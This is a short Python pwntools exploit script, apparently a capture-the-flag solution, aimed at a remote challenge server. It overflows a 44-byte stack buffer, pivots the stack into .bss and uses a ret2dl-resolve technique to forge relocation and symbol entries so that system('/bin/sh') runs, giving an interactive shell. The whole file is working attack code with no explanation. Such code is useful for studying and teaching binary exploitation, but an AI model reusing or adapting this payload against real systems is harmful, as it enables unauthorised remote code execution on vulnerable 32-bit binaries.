from pwn import *
#p=process('./pwn')
p = remote('da61f2425ce71e72c1ef02104c3bfb69.kr-lab.com',33865)

pop_ebp_ret=0x080485db
leave_ret=0x08048448
pppr=0x080485d9

fake_stack_size=0x800
bss=0x804A068
read_plt=0x8048396
read_got=0x804A00C
bss_stage=bss+fake_stack_size
dynsym=0x80481DC
dynstr=0x804827C
plt=0x08048380
relplt=0x804833C
rel_offset=bss_stage+28-relplt
fake_sym_addr=bss_stage+36
align=0x10-((fake_sym_addr-dynsym)&0xf) 
print 'align==>'+hex(align)
fake_sym_addr=fake_sym_addr+align
index=(fake_sym_addr-dynsym)/0x10
print 'index==>'+hex(index)
r_info=(index<<8)|0x7
print 'r_info==>'+hex(r_info)
fake_raloc=p32(read_got)+p32(r_info)
st_name=fake_sym_addr-dynstr+16
fake_sym=p32(st_name)+p32(0)+p32(0)+p32(0x12)

payload='a'*44
payload+=p32(read_plt)
payload+=p32(pppr)
payload+=p32(0)
payload+=p32(bss_stage)
payload+=p32(100)
payload+=p32(pop_ebp_ret)
payload+=p32(bss_stage)
payload+=p32(leave_ret)
p.sendline(payload)

binsh='/bin/sh'

payload='aaaa'
payload+=p32(plt)
payload+=p32(rel_offset)
payload+='aaaa'
payload+=p32(bss_stage+80)
payload+='aaaa'
payload+='aaaa'
payload+=fake_raloc
payload+='a'*align
payload+=fake_sym
payload+='system\0'
payload+='a'*(80-len(payload))
payload+=binsh+'\x00'
payload+='a'*(100-len(payload))
p.send(payload)
p.interactive()
